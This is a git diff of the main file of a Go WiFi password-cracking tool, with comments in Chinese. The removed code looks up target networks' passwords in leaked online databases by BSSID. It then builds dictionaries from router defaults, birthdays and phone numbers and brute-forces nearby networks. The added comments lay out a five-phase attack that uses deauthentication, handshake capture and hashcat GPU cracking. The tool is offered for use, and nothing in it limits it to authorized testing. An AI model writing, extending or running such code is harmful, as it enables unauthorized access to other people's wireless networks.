@@ -159,7 +159,6 @@ func main() {
 
 	// ============================================================
 	// 握手包捕获模式（--capture）
-	// 流程: 断WiFi → tcpdump监控 → bettercap deauth → 捕获握手 → 转hashcat → GPU破解
 	// ============================================================
 	if *captureMode {
 		runCaptureMode(targets, allPasswordsForTargets(targets, *dictFile), *verbose)
@@ -167,126 +166,14 @@ func main() {
 	}
 
 	// ============================================================
-	// 阶段3：全球WiFi密码库预查询（需联网，必须在爆破前完成）
-	// 数据源：p3wifi(3wifi.dev) + 万能钥匙(备用,已废弃)
+	// 所有模式统一进入智能攻击编排器
+	// Phase 1: 全球密码库查询（p3wifi + 万能钥匙备用）
+	// Phase 2: CoreWLAN快速验证TOP密码
+	// Phase 3: 握手包捕获 + hashcat GPU字典攻击
+	// Phase 4: hashcat GPU掩码暴力攻击
+	// Phase 5: CoreWLAN在线完整字典爆破（兜底）
 	// ============================================================
-	fmt.Println("\n  [3/5] 全球WiFi密码库预查询（需联网）...")
-
-	masterKeyPwds := make(map[string]string) // SSID → 查到的密码
-	for i, t := range targets {
-		if t.BSSID == "" {
-			fmt.Printf("    [%d/%d] %-20s BSSID为空，跳过\n", i+1, len(targets), t.SSID)
-			continue
-		}
-		fmt.Printf("    [%d/%d] %-20s ", i+1, len(targets), t.SSID)
-
-		// 优先查p3wifi全球密码库
-		pwd3, err3 := p3wifi.QueryByBSSID(t.BSSID)
-		if err3 == nil && pwd3 != "" {
-			fmt.Printf("✓ p3wifi命中! 密码=[%s]\n", pwd3)
-			masterKeyPwds[t.SSID] = pwd3
-			continue
-		}
-
-		// p3wifi未收录时尝试万能钥匙备用（大概率也失败，优雅降级）
-		pwdMK, _ := masterkey.Query(t.SSID, t.BSSID)
-		if pwdMK != "" {
-			fmt.Printf("✓ 万能钥匙命中! 密码=[%s]\n", pwdMK)
-			masterKeyPwds[t.SSID] = pwdMK
-			continue
-		}
-
-		fmt.Printf("未收录\n")
-	}
-
-	if len(masterKeyPwds) > 0 {
-		fmt.Printf("\n  [+] 密码库命中 %d 个目标（稍后验证连接）\n", len(masterKeyPwds))
-	}
-
-	// ============================================================
-	// 阶段4：构建智能密码列表
-	// 优先级：万能钥匙密码 → 路由器默认密码 → 中国定制字典 → 外部字典
-	// ============================================================
-	fmt.Println("\n  [4/5] 构建中国定制密码列表...")
-
-	var allPasswords []string
-
-	// 第0层：万能钥匙查到的密码（最高优先级，放最前面）
-	for _, t := range targets {
-		if pwd, ok := masterKeyPwds[t.SSID]; ok {
-			allPasswords = append(allPasswords, pwd)
-		}
-	}
-
-	// 第1层：路由器默认密码（针对每个目标SSID生成）
-	for _, t := range targets {
-		routerDefaults := cracker.GenerateRouterDefaults(t.SSID)
-		allPasswords = append(allPasswords, routerDefaults...)
-	}
-
-	// 第2层：中国WiFi定制字典（含生日/手机号/重复模式等）
-	allPasswords = append(allPasswords, dict.GenerateAllChinese()...)
-
-	// 第3层：外部字典文件
-	if *dictFile != "" {
-		absPath, _ := filepath.Abs(*dictFile)
-		extra, err := dict.LoadDictFile(absPath)
-		if err != nil {
-			fmt.Fprintf(os.Stderr, "  [!] 字典文件加载失败: %v\n", err)
-		} else {
-			fmt.Printf("  [+] 外部字典: %s (%d 条)\n", absPath, len(extra))
-			allPasswords = append(allPasswords, extra...)
-		}
-	}
-
-	// 去重（保持优先级顺序）
-	allPasswords = dict.MergeAndDedup(allPasswords)
-	fmt.Printf("  [+] 密码总量: %d 条\n", len(allPasswords))
-
-	// ============================================================
-	// 阶段5：开始爆破（会断开当前WiFi）
-	// 先记录原始WiFi，爆破完成后自动恢复
-	// ============================================================
-	originalSSID := scanner.CurrentSSID()
-	if originalSSID != "" {
-		fmt.Printf("\n  [!] 当前WiFi: %s（爆破完成后自动恢复）\n", originalSSID)
-	}
-
-	fmt.Println("\n  [5/5] 开始字典爆破...")
-
-	cfg := cracker.CrackConfig{
-		Delay:    time.Duration(*delay) * time.Millisecond,
-		Verbose:  *verbose,
-		MaxRetry: 1,
-	}
-
-	results := cracker.CrackAll(targets, allPasswords, cfg)
-
-	// 统计结果
-	successCount := 0
-	for _, r := range results {
-		if r.Success {
-			successCount++
-		}
-	}
-
-	// ============================================================
-	// 爆破完成：恢复原始WiFi连接
-	// ============================================================
-	if originalSSID != "" {
-		fmt.Printf("\n  [*] 正在恢复原WiFi: %s ...", originalSSID)
-		if scanner.ReconnectWiFi(originalSSID) {
-			fmt.Println(" ✓ 已恢复")
-		} else {
-			fmt.Println(" ✗ 恢复失败，请手动连接")
-		}
-	}
-
-	if successCount > 0 {
-		os.Exit(0)
-	} else {
-		os.Exit(1)
-	}
+	runSmartAttack(targets, *dictFile, *delay, *verbose)
 }
 
 // ============================================================
